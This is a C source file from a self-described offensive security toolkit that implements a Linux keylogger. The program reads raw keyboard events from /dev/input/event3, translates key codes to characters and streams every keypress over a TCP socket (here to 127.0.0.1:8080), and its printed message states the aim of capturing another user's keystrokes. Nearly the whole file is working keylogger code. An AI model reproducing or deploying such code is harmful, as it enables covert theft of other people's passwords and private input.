/*
 * 4some - offensive security tools
 * Copyright (C) 2025 ZhestyRin
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License.
 * See <https://www.gnu.org/licenses/> for details.
 */

#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>



 const char *keymap[256] = {
    [1]="ESC",[2]="1",[3]="2",[4]="3",[5]="4",
    [6]="5",[7]="6",[8]="7",[9]="8",[10]="9",
    [11]="0",[12]="-",[13]="=",[14]="BKSP",[15]="TAB",
    [16]="q",[17]="w",[18]="e",[19]="r",[20]="t",
    [21]="y",[22]="u",[23]="i",[24]="o",[25]="p",
    [26]="[",[27]="]",[28]="ENTER",[29]="CTRL",
    [30]="a",[31]="s",[32]="d",[33]="f",[34]="g",
    [35]="h",[36]="j",[37]="k",[38]="l",[39]=";",
    [40]="'",[41]="`",[42]="SHIFT",[43]="\\",
    [44]="z",[45]="x",[46]="c",[47]="v",[48]="b",
    [49]="n",[50]="m",[51]=",",[52]=".",[53]="/",
    [54]="SHIFT",[55]="*",[56]="ALT",[57]=" ",
    [58]="CAPS",[59]="F1",[60]="F2",[61]="F3",
    [62]="F4",[63]="F5",[64]="F6",[65]="F7",
    [66]="F8",[67]="F9",[68]="F10",[87]="F11",
    [88]="F12",[103]="UP",[105]="LEFT",[106]="RIGHT",
    [108]="DOWN",[111]="DEL",
};

   int main() {
  
    printf("This is a keylogger program\n");
    printf("I supposed this program would get the input key of other user then send it back over TCP protocol\n");
  
    /* int fd = open("/dev/input/event3", O_RDONLY);
     if(fd < 0) {
     perror("open");
     return 1;
     }

     struct input_event ev;

 
       while(1) {
       read(fd, &ev, sizeof(ev));
     
       if(ev.type == 1 && ev.value == 1) {
       printf("the character: %s\n", keymap[ev.code]);
       printf("the code is: %d\n", ev.code);
       }
     
     } */ // use for later maybe, or work as an example before anything working.

  
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8080);  
    
    if(inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0) {
      perror("invalid address");
      return 1;
    }
    
     int socketfd = socket(AF_INET, SOCK_STREAM, 0); 
         if(connect(socketfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
	   perror("connection failed");
	 }
    
   
	 int fd = open("/dev/input/event3", O_RDONLY);
	  if(fd < 0) {
	  perror("open");
	  return 1;
	  }

  struct input_event ev;     

      while(1) {
    
        read(fd, &ev, sizeof(ev));
    
     if(ev.type == 1 && ev.value == 1) {
       write(socketfd, keymap[ev.code], strlen(keymap[ev.code]));
       }
   }
    
 
    
  return 0;

  }







